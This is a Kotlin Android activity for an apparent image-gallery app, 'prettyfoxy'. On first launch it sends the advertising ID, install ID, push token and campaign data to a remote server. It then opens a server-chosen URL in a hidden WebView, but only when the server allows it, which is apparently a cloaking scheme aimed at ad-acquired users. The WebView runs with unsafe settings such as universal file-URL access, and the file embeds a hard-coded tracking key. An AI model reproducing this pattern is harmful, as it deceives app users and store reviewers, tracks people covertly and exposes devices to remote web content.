package com.prettyfoxy

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.lifecycle.lifecycleScope
import androidx.recyclerview.widget.LinearLayoutManager
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.tasks.OnCompleteListener
import com.google.firebase.messaging.FirebaseMessaging
import com.prettyfoxy.adapterfoxy.FoxyAdapter
import com.prettyfoxy.apifoxy.RetrofitFoxyIns
import com.prettyfoxy.databinding.ActivityMainBinding
import com.prettyfoxy.datafoxy.FoxyInstallEntity
import com.prettyfoxy.datafoxy.RequestPushToken
import com.prettyfoxy.datafoxy.UserFoxyEntity
import com.prettyfoxy.utilsfoxy.FoxyImageIns
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.lang.Exception
import java.util.*

class MainActivity : AppCompatActivity() {
    var foxyToken : String? = ""
    private var foxadapter : FoxyAdapter? = null

    private lateinit var binding: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        foxyInstalluser()
        initFoxRcView()
    }


    private fun initFoxRcView() = with(binding){
        foxadapter = FoxyAdapter(FoxyImageIns.foxylist,this@MainActivity)
        rcfoxyView.layoutManager = LinearLayoutManager(this@MainActivity,LinearLayoutManager.HORIZONTAL,false)
        rcfoxyView.adapter = foxadapter
    }





    private fun foxyInstalluser(){
        val conversionListener : AppsFlyerConversionListener = object :
            AppsFlyerConversionListener {
            @RequiresApi(Build.VERSION_CODES.KITKAT)
            override fun onConversionDataSuccess(conversionData: MutableMap<String, Any>?) {
                val status : String = Objects.requireNonNull(conversionData!!["af_status"]).toString()
                val id = AppsFlyerLib.getInstance().getAppsFlyerUID(this@MainActivity)

                if (Objects.requireNonNull(conversionData["is_first_launch"]).toString() == "true"){

                    permission()
                    val time = TimeZone.getDefault()

                    val adId =
                        if (conversionData.containsKey("adgroup_id")) conversionData["adgroup_id"].toString() else "" //conversionData["adgroup_id"].toString()
                    val campaign =
                        if (conversionData.containsKey("campaign")) conversionData["campaign"].toString() else ""

                    if(status == "Non-organic") {
                        lifecycleScope.launch(Dispatchers.IO) {
                            val idfa = AdvertisingIdClient.getAdvertisingIdInfo(applicationContext)?.id

                            val foxyData = RetrofitFoxyIns.api.setFoxyData(
                                UserFoxyEntity(
                                    user_id = id,
                                    timezone = time.id,
                                    app_package = "com.prettyfoxy",
                                    idfa = idfa,
                                    push_token =  foxyToken,
                                    ad_campaign = campaign,
                                    ad_id = adId
                                )
                            )
                            Log.e("Response", " Info : $foxyData")
                            withContext(Dispatchers.Main){
                                foxyWebConf(foxyData)
                            }

                            FirebaseMessaging.getInstance().token.addOnCompleteListener(
                                OnCompleteListener { task ->
                                    if (!task.isSuccessful) {
                                        return@OnCompleteListener
                                    }
                                    foxyToken = task.result
                                    try {
                                        lifecycleScope.launch {
                                            installsPushToken(id, foxyToken!!)
                                        }
                                    } catch (e : Exception){
                                        Log.e("Exception", e.toString())
                                    }
                                })
                        }
                    } else {
                        lifecycleScope.launch(Dispatchers.IO) {
                            try {
                                val data = RetrofitFoxyIns.api.setFoxyData(UserFoxyEntity(id,time.id,"com.prettyfoxy", push_token = foxyToken))
                                withContext(Dispatchers.Main){
                                    foxyWebConf(data)
                                }
                                Log.d("Response", data.toString())
                            }catch(e: Exception){
                                Log.e("Exception", e.toString())
                            }

                        }

                        FirebaseMessaging.getInstance().token.addOnCompleteListener(
                            OnCompleteListener { task ->
                                if (!task.isSuccessful) {
                                    return@OnCompleteListener
                                }
                                foxyToken = task.result
                                try {
                                    lifecycleScope.launch {
                                        installsPushToken(id, foxyToken!!)
                                    }
                                } catch (e : Exception){
                                    Log.e("Exception", e.toString())
                                }
                            })

                    }

                } else {
                    FirebaseMessaging.getInstance().token.addOnCompleteListener(OnCompleteListener { task ->
                        if (!task.isSuccessful) {
                            return@OnCompleteListener
                        }
                        foxyToken = task.result

                        try {
                            lifecycleScope.launch(Dispatchers.IO) {
                                try {
                                    val data = RetrofitFoxyIns.api.installUser(id)

                                    if (foxyToken != data.entity.push_token)
                                        foxyToken?.let {
                                            RetrofitFoxyIns.api.installFoxyUseridToken(id, RequestPushToken(it))
                                        }

                                    else Log.e("Push", "Not Changed")
                                    withContext(Dispatchers.Main){
                                        foxyWebConf(data)
                                        Log.e("Response",data.toString())
                                    }

                                }

                                catch (e: Exception) {
                                    Log.e("Exception", e.toString())

                                }
                            }
                        } catch (e: Exception) {
                            Log.e("Exception", e.toString())

                        }

                    })
                }

            }

            override fun onConversionDataFail(p0: String?) {

            }

            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

            }

            override fun onAttributionFailure(p0: String?) {

            }

        }
        AppsFlyerLib.getInstance().init("YNtzzgRewnTtSp5q5m3Vde", conversionListener, applicationContext)
        AppsFlyerLib.getInstance().start(this)
    }

    suspend fun installsPushToken(userId: String, pushToken: String){
        try{
            RetrofitFoxyIns.api.installFoxyUseridToken(userId, RequestPushToken(pushToken))
        }
        catch (e: Exception) {
            Log.e("Exception", e.toString())

        }
    }

    fun permission(){
        Log.e("permission","here")
        if(ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NOTIFICATION_POLICY) != PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(this,arrayOf(
                Manifest.permission.ACCESS_NOTIFICATION_POLICY
            ),1)
        }
    }



    private fun foxyWebConf(foxyData : FoxyInstallEntity) = with(binding) {

        val cashDir = applicationContext.filesDir.absolutePath + "cache/"
        val settings = webView.settings
        settings.javaScriptEnabled = true
        settings.setSupportZoom(true)
        settings.useWideViewPort = true
        settings.loadWithOverviewMode = true
        settings.setAppCacheEnabled(true)
        settings.allowFileAccess = true
        settings.setAppCacheMaxSize(1024 * 1024 * 8)
        settings.setSupportMultipleWindows(true)
        settings.javaScriptCanOpenWindowsAutomatically = true
        settings.setAppCachePath(cashDir)
        settings.allowFileAccess = true
        settings.allowContentAccess = true
        settings.saveFormData = true
        settings.javaScriptCanOpenWindowsAutomatically = true
        settings.loadWithOverviewMode = true
        settings.domStorageEnabled = true
        settings.allowUniversalAccessFromFileURLs = true



        if(foxyData.allow) {
            webView.webViewClient = object : WebViewClient() {

                override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                    if (url != null) {
                        view?.loadUrl(url)
                    }
                    return true

                }
            }

            webView.webChromeClient = object : WebChromeClient(){
                override fun onProgressChanged(view: WebView?, newProgress: Int) {
                    super.onProgressChanged(view, newProgress)
                    if(newProgress == 100){
                        pFoxyBar.visibility = View.GONE
                    }
                    else {
                        pFoxyBar.visibility = View.VISIBLE
                    }
                }
            }

            foxyData.goto?.let { webView.loadUrl(it) }

        } else {
            webView.visibility = View.GONE
            pFoxyBar.visibility = View.GONE
        }


    }
}